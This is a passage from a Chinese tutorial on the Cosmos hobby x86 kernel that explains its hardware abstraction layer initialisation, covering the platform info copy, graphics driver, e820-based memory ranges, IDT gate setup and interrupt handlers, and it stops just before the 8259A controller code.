<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_hal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 平台初始化函数</span></span><br><span class="line">    <span class="built_in">init_halplaltform</span>();</span><br><span class="line">    <span class="comment">// 将 img 移动到高地址的内存空间，防止被覆盖</span></span><br><span class="line">    <span class="built_in">move_img2maxpadr</span>(&amp;kmachbsp);</span><br><span class="line">    <span class="comment">// 初始化内存</span></span><br><span class="line">    <span class="built_in">init_halmm</span>(); </span><br><span class="line">    <span class="comment">// 初始化中断</span></span><br><span class="line">    <span class="built_in">init_halintupt</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来看一下初始化平台。</p>
<h2 id="初始化平台"><a href="#初始化平台" class="headerlink" title="初始化平台"></a>初始化平台</h2><p>初始化平台主要完成两个任务，一个是把二级引导器建立的机器信息结构复制到 hal 层的一个全局变量中，方便内核中的其他代码使用里面的信息，之后二级引导器建立的数据所占用的内存都会被释放；二是初始化图形显示驱动，内核运行过程要在屏幕上输出信息。</p>
<p>初始化平台相关代码在 <code>Cosmos/hal/x86/halplatform.c</code> 文件中，以下代码实现了机器信息结构的复制。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_machbstart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">machbstart_t</span> *kmbsp = &amp;kmachbsp;</span><br><span class="line">    <span class="type">machbstart_t</span> *smbsp = MBSPADR; <span class="comment">// 物理地址 1MB 处存放着此前初始化的 machbstart_t 结构体。</span></span><br><span class="line">    <span class="built_in">machbstart_t_init</span>(kmbsp);</span><br><span class="line">    <span class="comment">// 要把地址转换成虚拟地址并复制</span></span><br><span class="line">    <span class="built_in">memcopy</span>((<span class="type">void</span> *)<span class="built_in">phyadr_to_viradr</span>((<span class="type">adr_t</span>)smbsp), (<span class="type">void</span> *)kmbsp, <span class="built_in">sizeof</span>(<span class="type">machbstart_t</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 平台初始化函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_halplaltform</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 复制机器信息结构</span></span><br><span class="line">    <span class="built_in">init_machbstart</span>();</span><br><span class="line">    <span class="comment">// 初始化图形显示驱动</span></span><br><span class="line">    <span class="built_in">init_bdvideo</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中值得关注的一个变量为 <code>kmachbsp</code> ，该变量是一个 hal 层的全局变量，定义在 <code>Cosmos/hal/x86/halglobal.c</code> 文件中，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量定义变量放在data段</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HAL_DEFGLOB_VARIABLE(vartype,varname) \</span></span><br><span class="line"><span class="meta">EXTERN  __attribute__((section(<span class="string">&quot;.data&quot;</span>))) vartype varname</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">HAL_DEFGLOB_VARIABLE</span>(<span class="type">machbstart_t</span>,kmachbsp);</span><br></pre></td></tr></table></figure>

<p>下面再看一下初始化图形显示驱动，相关代码在 <code>Cosmos/hal/x86/bdvideo.c</code> 文件中，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化图形显示驱动</span></span><br><span class="line"><span class="function">PUBLIC LKINIT <span class="type">void</span> <span class="title">init_bdvideo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">dftgraph_t</span> *kghp = &amp;kdftgh;</span><br><span class="line">    <span class="comment">// 初始化图形数据结构，里面放有图形模式，分辨率，图形驱动函数指针</span></span><br><span class="line">    <span class="built_in">init_dftgraph</span>();</span><br><span class="line">    <span class="comment">// 初始bga图形显卡的函数指针</span></span><br><span class="line">    <span class="built_in">init_bga</span>();</span><br><span class="line">    <span class="comment">// 初始vbe图形显卡的函数指针</span></span><br><span class="line">    <span class="built_in">init_vbe</span>();</span><br><span class="line">    <span class="comment">// 清空屏幕 为黑色</span></span><br><span class="line">    <span class="built_in">fill_graph</span>(kghp, <span class="built_in">BGRA</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="comment">// 显示背景图片 </span></span><br><span class="line">    <span class="built_in">set_charsdxwflush</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">hal_background</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>init_defgraph()</code> 函数初始了 <code>dftgraph_t</code> 结构体类型的变量 <code>kdftgh</code>，<code>dftgraph_t</code> 相关结构体定义在 <code>Cosmos/hal/x86/halglobal.c</code> 文件中，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_DFTGRAPH</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">u64_t</span> gh_mode;         <span class="comment">//图形模式</span></span><br><span class="line">    <span class="type">u64_t</span> gh_x;            <span class="comment">//水平像素点</span></span><br><span class="line">    <span class="type">u64_t</span> gh_y;            <span class="comment">//垂直像素点</span></span><br><span class="line">    <span class="type">u64_t</span> gh_framphyadr;   <span class="comment">//显存物理地址 </span></span><br><span class="line">    <span class="type">u64_t</span> gh_fvrmphyadr;   <span class="comment">//显存虚拟地址</span></span><br><span class="line">    <span class="type">u64_t</span> gh_fvrmsz;       <span class="comment">//显存大小</span></span><br><span class="line">    <span class="type">u64_t</span> gh_onepixbits;   <span class="comment">//一个像素字占用的数据位数</span></span><br><span class="line">    <span class="type">u64_t</span> gh_onepixbyte;</span><br><span class="line">    <span class="type">u64_t</span> gh_vbemodenr;    <span class="comment">//vbe模式号</span></span><br><span class="line">    <span class="type">u64_t</span> gh_bank;         <span class="comment">//显存的bank数</span></span><br><span class="line">    <span class="type">u64_t</span> gh_curdipbnk;    <span class="comment">//当前bank</span></span><br><span class="line">    <span class="type">u64_t</span> gh_nextbnk;      <span class="comment">//下一个bank</span></span><br><span class="line">    <span class="type">u64_t</span> gh_banksz;       <span class="comment">//bank大小</span></span><br><span class="line">    <span class="type">u64_t</span> gh_fontadr;      <span class="comment">//字库地址</span></span><br><span class="line">    <span class="type">u64_t</span> gh_fontsz;       <span class="comment">//字库大小</span></span><br><span class="line">    <span class="type">u64_t</span> gh_fnthight;     <span class="comment">//字体高度</span></span><br><span class="line">    <span class="type">u64_t</span> gh_nxtcharsx;    <span class="comment">//下一字符显示的x坐标</span></span><br><span class="line">    <span class="type">u64_t</span> gh_nxtcharsy;    <span class="comment">//下一字符显示的y坐标</span></span><br><span class="line">    <span class="type">u64_t</span> gh_linesz;       <span class="comment">//字符行高</span></span><br><span class="line">    <span class="type">pixl_t</span> gh_deffontpx;   <span class="comment">//默认字体大小</span></span><br><span class="line">    <span class="type">u64_t</span> gh_chardxw;</span><br><span class="line">    <span class="type">u64_t</span> gh_flush;</span><br><span class="line">    <span class="type">u64_t</span> gh_framnr;</span><br><span class="line">    <span class="type">u64_t</span> gh_fshdata;      <span class="comment">//刷新相关的</span></span><br><span class="line">    <span class="type">dftghops_t</span> gh_opfun;   <span class="comment">//图形驱动操作函数指针结构体</span></span><br><span class="line">&#125;<span class="type">dftgraph_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_DFTGHOPS</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//读写显存数据</span></span><br><span class="line">    <span class="built_in">size_t</span> (*dgo_read)(<span class="type">void</span>* ghpdev,<span class="type">void</span>* outp,<span class="type">size_t</span> rdsz);</span><br><span class="line">    <span class="built_in">size_t</span> (*dgo_write)(<span class="type">void</span>* ghpdev,<span class="type">void</span>* inp,<span class="type">size_t</span> wesz);</span><br><span class="line">    <span class="built_in">sint_t</span> (*dgo_ioctrl)(<span class="type">void</span>* ghpdev,<span class="type">void</span>* outp,<span class="type">uint_t</span> iocode);</span><br><span class="line">    <span class="comment">//刷新</span></span><br><span class="line">    <span class="built_in">void</span>   (*dgo_flush)(<span class="type">void</span>* ghpdev);</span><br><span class="line">    <span class="built_in">sint_t</span> (*dgo_set_bank)(<span class="type">void</span>* ghpdev, <span class="type">sint_t</span> bnr);</span><br><span class="line">    <span class="comment">//读写像素</span></span><br><span class="line">    <span class="built_in">pixl_t</span> (*dgo_readpix)(<span class="type">void</span>* ghpdev,<span class="type">uint_t</span> x,<span class="type">uint_t</span> y);</span><br><span class="line">    <span class="built_in">void</span>   (*dgo_writepix)(<span class="type">void</span>* ghpdev,<span class="type">pixl_t</span> pix,<span class="type">uint_t</span> x,<span class="type">uint_t</span> y);</span><br><span class="line">    <span class="comment">//直接读写像素 </span></span><br><span class="line">    <span class="built_in">pixl_t</span> (*dgo_dxreadpix)(<span class="type">void</span>* ghpdev,<span class="type">uint_t</span> x,<span class="type">uint_t</span> y);</span><br><span class="line">    <span class="built_in">void</span>   (*dgo_dxwritepix)(<span class="type">void</span>* ghpdev,<span class="type">pixl_t</span> pix,<span class="type">uint_t</span> x,<span class="type">uint_t</span> y);</span><br><span class="line">    <span class="comment">//设置x，y坐标和偏移</span></span><br><span class="line">    <span class="built_in">sint_t</span> (*dgo_set_xy)(<span class="type">void</span>* ghpdev,<span class="type">uint_t</span> x,<span class="type">uint_t</span> y);</span><br><span class="line">    <span class="built_in">sint_t</span> (*dgo_set_vwh)(<span class="type">void</span>* ghpdev,<span class="type">uint_t</span> vwt,<span class="type">uint_t</span> vhi);</span><br><span class="line">    <span class="built_in">sint_t</span> (*dgo_set_xyoffset)(<span class="type">void</span>* ghpdev,<span class="type">uint_t</span> xoff,<span class="type">uint_t</span> yoff);</span><br><span class="line">    <span class="comment">//获取x，y坐标和偏移</span></span><br><span class="line">    <span class="built_in">sint_t</span> (*dgo_get_xy)(<span class="type">void</span>* ghpdev,<span class="type">uint_t</span>* rx,<span class="type">uint_t</span>* ry);</span><br><span class="line">    <span class="built_in">sint_t</span> (*dgo_get_vwh)(<span class="type">void</span>* ghpdev,<span class="type">uint_t</span>* rvwt,<span class="type">uint_t</span>* rvhi);</span><br><span class="line">    <span class="built_in">sint_t</span> (*dgo_get_xyoffset)(<span class="type">void</span>* ghpdev,<span class="type">uint_t</span>* rxoff,<span class="type">uint_t</span>* ryoff);</span><br><span class="line">&#125;<span class="type">dftghops_t</span>;</span><br><span class="line"><span class="comment">//刷新显存</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">flush_videoram</span><span class="params">(<span class="type">dftgraph_t</span> *kghp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    kghp-&gt;gh_opfun.<span class="built_in">dgo_flush</span>(kghp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>初始化图形显示驱动，这里实现了设置背景图片，显示 Cosmos 的版本、编译时间、CPU工作模式、内存大小等数据。</p>
<h2 id="初始化内存"><a href="#初始化内存" class="headerlink" title="初始化内存"></a>初始化内存</h2><p>hal 层的内存初始化比较容易，只要向内存管理器提供内存空间布局信息就可以。</p>
<p>在二级引导器中我们已经获取了内存布局信息，但是 Cosmos 的内存管理器需要保存更多的信息，这里就需要以 BIOS 提供的结构为基础，设计一套新的数据结构，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PMR_T_OSAPUSERRAM 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMR_T_RESERVRAM 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMR_T_HWUSERRAM 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMR_T_ARACONRAM 0xf</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMR_T_BUGRAM 0xff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMR_F_X86_32 (1&lt;&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMR_F_X86_64 (1&lt;&lt;1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMR_F_ARM_32 (1&lt;&lt;2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMR_F_ARM_64 (1&lt;&lt;3)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMR_F_HAL_MASK 0xff</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_PHYMMARGE</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">spinlock_t</span> pmr_lock;<span class="comment">//保护这个结构是自旋锁</span></span><br><span class="line">    <span class="type">u32_t</span> pmr_type;     <span class="comment">//内存地址空间类型</span></span><br><span class="line">    <span class="type">u32_t</span> pmr_stype;</span><br><span class="line">    <span class="type">u32_t</span> pmr_dtype;    <span class="comment">//内存地址空间的子类型，见上面的宏</span></span><br><span class="line">    <span class="type">u32_t</span> pmr_flgs;     <span class="comment">//结构的标志与状态</span></span><br><span class="line">    <span class="type">u32_t</span> pmr_stus;</span><br><span class="line">    <span class="type">u64_t</span> pmr_saddr;    <span class="comment">//内存空间的开始地址</span></span><br><span class="line">    <span class="type">u64_t</span> pmr_lsize;    <span class="comment">//内存空间的大小</span></span><br><span class="line">    <span class="type">u64_t</span> pmr_end;      <span class="comment">//内存空间的结束地址</span></span><br><span class="line">    <span class="type">u64_t</span> pmr_rrvmsaddr;<span class="comment">//内存保留空间的开始地址</span></span><br><span class="line">    <span class="type">u64_t</span> pmr_rrvmend;  <span class="comment">//内存保留空间的结束地址</span></span><br><span class="line">    <span class="type">void</span>* pmr_prip;     <span class="comment">//结构的私有数据指针，以后扩展所用</span></span><br><span class="line">    <span class="type">void</span>* pmr_extp;     <span class="comment">//结构的扩展数据指针，以后扩展所用</span></span><br><span class="line">&#125;<span class="type">phymmarge_t</span>;</span><br></pre></td></tr></table></figure>

<p>下面开始将  e820map_t 内存结构中的数据复制到 phymmarge_t 结构中来，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">u64_t</span> <span class="title">initpmrge_core</span><span class="params">(<span class="type">e820map_t</span> *e8sp, <span class="type">u64_t</span> e8nr, <span class="type">phymmarge_t</span> *pmargesp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">u64_t</span> retnr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">u64_t</span> i = <span class="number">0</span>; i &lt; e8nr; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//根据一个e820map_t结构建立一个phymmarge_t结构</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">init_one_pmrge</span>(&amp;e8sp[i], &amp;pmargesp[i]) == FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> retnr;</span><br><span class="line">        &#125;</span><br><span class="line">        retnr++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retnr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_phymmarge</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">machbstart_t</span> *mbsp = &amp;kmachbsp;</span><br><span class="line">    <span class="type">phymmarge_t</span> *pmarge_adr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">u64_t</span> pmrgesz = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//根据machbstart_t机器信息结构计算获得phymmarge_t结构的开始地址和大小</span></span><br><span class="line">    <span class="built_in">ret_phymmarge_adrandsz</span>(mbsp, &amp;pmarge_adr, &amp;pmrgesz);</span><br><span class="line">    <span class="type">u64_t</span> tmppmrphyadr = mbsp-&gt;mb_nextwtpadr;</span><br><span class="line">    <span class="type">e820map_t</span> *e8p = (<span class="type">e820map_t</span> *)((<span class="type">adr_t</span>)(mbsp-&gt;mb_e820padr));</span><br><span class="line">    <span class="comment">//建立phymmarge_t结构</span></span><br><span class="line">    <span class="type">u64_t</span> ipmgnr = <span class="built_in">initpmrge_core</span>(e8p, mbsp-&gt;mb_e820nr, pmarge_adr);</span><br><span class="line">    <span class="comment">//把phymmarge_t结构的地址大小个数保存machbstart_t机器信息结构中</span></span><br><span class="line">    mbsp-&gt;mb_e820expadr = tmppmrphyadr;</span><br><span class="line">    mbsp-&gt;mb_e820exnr = ipmgnr;</span><br><span class="line">    mbsp-&gt;mb_e820exsz = ipmgnr * <span class="built_in">sizeof</span>(<span class="type">phymmarge_t</span>);</span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = <span class="built_in">PAGE_ALIGN</span>(mbsp-&gt;mb_e820expadr + mbsp-&gt;mb_e820exsz);</span><br><span class="line">    <span class="comment">//phymmarge_t结构中地址空间从低到高进行排序，我已经帮你写好了</span></span><br><span class="line">    <span class="built_in">phymmarge_sort</span>(pmarge_adr, ipmgnr);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="初始化中断"><a href="#初始化中断" class="headerlink" title="初始化中断"></a>初始化中断</h2><p>在 x86 CPU 上，最多支持 256 个中断，这意味着我们要准备 256 个中断门描述符和 256 个中断处理程序的入口。</p>
<p>下面我们来定义中断门描述符，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中断门描述符</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_GATE</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">u16_t</span>   offset_low;     <span class="comment">/* 偏移 */</span></span><br><span class="line">        <span class="type">u16_t</span>   selector;       <span class="comment">/* 段选择子 */</span></span><br><span class="line">        <span class="type">u8_t</span>    dcount;         <span class="comment">/* 该字段只在调用门描述符中有效。如果在利用调用门调用子程序时引起特权级的转换和堆栈的改变，需要将外层堆栈中的参数复制到内层堆栈。该双字计数字段就是用于说明这种情况发生时，要复制的双字参数的数量。*/</span></span><br><span class="line">        <span class="type">u8_t</span>    attr;           <span class="comment">/* P(1) DPL(2) DT(1) TYPE(4) */</span></span><br><span class="line">        <span class="type">u16_t</span>   offset_high;    <span class="comment">/* 偏移的高位段 */</span></span><br><span class="line">        <span class="type">u32_t</span>   offset_high_h;</span><br><span class="line">        <span class="type">u32_t</span>   offset_resv;</span><br><span class="line">&#125;__attribute__((packed)) <span class="type">gate_t</span>;</span><br><span class="line"><span class="comment">//定义中断表</span></span><br><span class="line"><span class="built_in">HAL_DEFGLOB_VARIABLE</span>(<span class="type">gate_t</span>,x64_idt)[IDTMAX];</span><br></pre></td></tr></table></figure>

<p>定义好中断表后，需要进行设置中断门描述符数据，相关代码如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vector 向量也是中断号</span></span><br><span class="line"><span class="comment">//desc_type 中断门类型，中断门，陷阱门</span></span><br><span class="line"><span class="comment">//handler 中断处理程序的入口地址</span></span><br><span class="line"><span class="comment">//privilege 中断门的权限级别</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_idt_desc</span><span class="params">(<span class="type">u8_t</span> vector, <span class="type">u8_t</span> desc_type, <span class="type">inthandler_t</span> handler, <span class="type">u8_t</span> privilege)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">gate_t</span> *p_gate = &amp;x64_idt[vector];</span><br><span class="line">    <span class="type">u64_t</span> base = (<span class="type">u64_t</span>)handler;</span><br><span class="line">    p_gate-&gt;offset_low = base &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">    p_gate-&gt;selector = SELECTOR_KERNEL_CS;</span><br><span class="line">    p_gate-&gt;dcount = <span class="number">0</span>;</span><br><span class="line">    p_gate-&gt;attr = (<span class="type">u8_t</span>)(desc_type | (privilege &lt;&lt; <span class="number">5</span>));</span><br><span class="line">    p_gate-&gt;offset_high = (<span class="type">u16_t</span>)((base &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">    p_gate-&gt;offset_high_h = (<span class="type">u32_t</span>)((base &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    p_gate-&gt;offset_resv = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，我们需要设置中断处理程序，中断处理程序只负责这三件事。</p>
<ol>
<li>保护 CPU 寄存器，即中断发生时的程序运行的上下文。</li>
<li>调用中断处理程序，这个程序可以是修复异常的，可以是设备驱动程序中对设备响应的程序。</li>
<li>恢复 CPU 寄存器，即恢复中断时程序运行的上下文，使程序继续运行。</li>
</ol>
<p>下面为部分中断处理程序相关代码。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//除法错误异常 比如除0</span></span><br><span class="line">exc_divide_error:</span><br><span class="line">  SRFTFAULT <span class="number">0</span></span><br><span class="line"><span class="comment">//单步执行异常</span></span><br><span class="line">exc_single_step_exception:</span><br><span class="line">  SRFTFAULT <span class="number">1</span></span><br><span class="line">exc_nmi:</span><br><span class="line">  SRFTFAULT <span class="number">2</span></span><br><span class="line"><span class="comment">//调试断点异常</span></span><br><span class="line">exc_breakpoint_exception:</span><br><span class="line">  SRFTFAULT <span class="number">3</span></span><br><span class="line"><span class="comment">//溢出异常</span></span><br><span class="line">exc_overflow:</span><br><span class="line">  SRFTFAULT <span class="number">4</span></span><br><span class="line"><span class="comment">//段不存在异常</span></span><br><span class="line">exc_segment_not_present:</span><br><span class="line">  SRFTFAULT_ECODE <span class="number">11</span></span><br><span class="line"><span class="comment">//栈异常</span></span><br><span class="line">exc_stack_exception:</span><br><span class="line">  SRFTFAULT_ECODE <span class="number">12</span></span><br><span class="line"><span class="comment">//通用异常</span></span><br><span class="line">exc_general_protection:</span><br><span class="line">  SRFTFAULT_ECODE <span class="number">13</span></span><br><span class="line"><span class="comment">//缺页异常</span></span><br><span class="line">exc_page_fault:</span><br><span class="line">  SRFTFAULT_ECODE <span class="number">14</span></span><br><span class="line">hxi_exc_general_intpfault:</span><br><span class="line">  SRFTFAULT <span class="number">256</span></span><br><span class="line"><span class="comment">//硬件1～7号中断</span></span><br><span class="line">hxi_hwint00:</span><br><span class="line">  <span class="built_in">HARWINT</span>  (INT_VECTOR_IRQ0+<span class="number">0</span>)</span><br><span class="line">hxi_hwint01:</span><br><span class="line">  <span class="built_in">HARWINT</span>  (INT_VECTOR_IRQ0+<span class="number">1</span>)</span><br><span class="line">hxi_hwint02:</span><br><span class="line">  <span class="built_in">HARWINT</span>  (INT_VECTOR_IRQ0+<span class="number">2</span>)</span><br><span class="line">hxi_hwint03:</span><br><span class="line">  <span class="built_in">HARWINT</span>  (INT_VECTOR_IRQ0+<span class="number">3</span>)</span><br><span class="line">hxi_hwint04:</span><br><span class="line">  <span class="built_in">HARWINT</span>  (INT_VECTOR_IRQ0+<span class="number">4</span>)</span><br><span class="line">hxi_hwint05:</span><br><span class="line">  <span class="built_in">HARWINT</span>  (INT_VECTOR_IRQ0+<span class="number">5</span>)</span><br><span class="line">hxi_hwint06:</span><br><span class="line">  <span class="built_in">HARWINT</span>  (INT_VECTOR_IRQ0+<span class="number">6</span>)</span><br><span class="line">hxi_hwint07:</span><br><span class="line">  <span class="built_in">HARWINT</span>  (INT_VECTOR_IRQ0+<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p>有了中断处理程序的入口地址，就可以设置中断描述符了，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_idt_descriptor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 一开始把所有中断的处理程序设置为保留的通用处理程序</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">u16_t</span> intindx = <span class="number">0</span>; intindx &lt;= <span class="number">255</span>; intindx++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">set_idt_desc</span>((<span class="type">u8_t</span>)intindx, DA_386IGate, hxi_exc_general_intpfault, PRIVILEGE_KRNL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对已知的中断和异常进一步设置，这会覆盖之前的通用处理程序</span></span><br><span class="line">    <span class="built_in">set_idt_desc</span>(INT_VECTOR_DIVIDE, DA_386IGate, exc_divide_error, PRIVILEGE_KRNL);</span><br><span class="line">    <span class="built_in">set_idt_desc</span>(INT_VECTOR_DEBUG, DA_386IGate, exc_single_step_exception, PRIVILEGE_KRNL);</span><br><span class="line">    <span class="built_in">set_idt_desc</span>(INT_VECTOR_NMI, DA_386IGate, exc_nmi, PRIVILEGE_KRNL);</span><br><span class="line">    <span class="built_in">set_idt_desc</span>(INT_VECTOR_BREAKPOINT, DA_386IGate, exc_breakpoint_exception, PRIVILEGE_USER);</span><br><span class="line">    <span class="built_in">set_idt_desc</span>(INT_VECTOR_OVERFLOW, DA_386IGate, exc_overflow, PRIVILEGE_USER);</span><br><span class="line">    ....</span><br><span class="line">    <span class="built_in">set_idt_desc</span>(INT_VECTOR_PAGE_FAULT, DA_386IGate, exc_page_fault, PRIVILEGE_KRNL);</span><br><span class="line">    <span class="built_in">set_idt_desc</span>(INT_VECTOR_IRQ0 + <span class="number">0</span>, DA_386IGate, hxi_hwint00, PRIVILEGE_KRNL);</span><br><span class="line">    <span class="built_in">set_idt_desc</span>(INT_VECTOR_IRQ0 + <span class="number">1</span>, DA_386IGate, hxi_hwint01, PRIVILEGE_KRNL);</span><br><span class="line">    <span class="built_in">set_idt_desc</span>(INT_VECTOR_IRQ0 + <span class="number">2</span>, DA_386IGate, hxi_hwint02, PRIVILEGE_KRNL);</span><br><span class="line">    <span class="built_in">set_idt_desc</span>(INT_VECTOR_IRQ0 + <span class="number">3</span>, DA_386IGate, hxi_hwint03, PRIVILEGE_KRNL);</span><br><span class="line">    ....</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后再实现中断处理函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//中断处理函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hal_do_hwint</span><span class="params">(<span class="type">uint_t</span> intnumb, <span class="type">void</span> *krnlsframp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">intfltdsc_t</span> *ifdscp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">cpuflg_t</span> cpuflg;</span><br><span class="line">    <span class="keyword">if</span> (intnumb &gt; IDTMAX || krnlsframp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">hal_sysdie</span>(<span class="string">&quot;hal_do_hwint fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根据中断号获取中断异常描述符地址    </span></span><br><span class="line">    ifdscp = <span class="built_in">hal_retn_intfltdsc</span>(intnumb);</span><br><span class="line">    <span class="keyword">if</span> (ifdscp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">hal_sysdie</span>(<span class="string">&quot;hal_do_hwint ifdscp NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对断异常描述符加锁并中断</span></span><br><span class="line">    <span class="built_in">hal_spinlock_saveflg_cli</span>(&amp;ifdscp-&gt;i_lock, &amp;cpuflg);</span><br><span class="line">    ifdscp-&gt;i_indx++;</span><br><span class="line">    ifdscp-&gt;i_deep++;</span><br><span class="line">    <span class="comment">// 运行中断处理的回调函数</span></span><br><span class="line">    <span class="built_in">hal_run_intflthandle</span>(intnumb, krnlsframp);</span><br><span class="line">    ifdscp-&gt;i_deep--;</span><br><span class="line">    <span class="comment">// 解锁并恢复中断状态</span></span><br><span class="line">    <span class="built_in">hal_spinunlock_restflg_sti</span>(&amp;ifdscp-&gt;i_lock, &amp;cpuflg);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="初始化中断控制器"><a href="#初始化中断控制器" class="headerlink" title="初始化中断控制器"></a>初始化中断控制器</h2><p>前面实现了 CPU 端的中断，接下来需要初始化中断控制器，处理 CPU 与设备之间的中断，这里选择 8259A 中断控制器。</p>
<p>相关代码在 <code>Cosmos/hal/x86/i8259.c</code> 中，具体实现如下所示。</p>
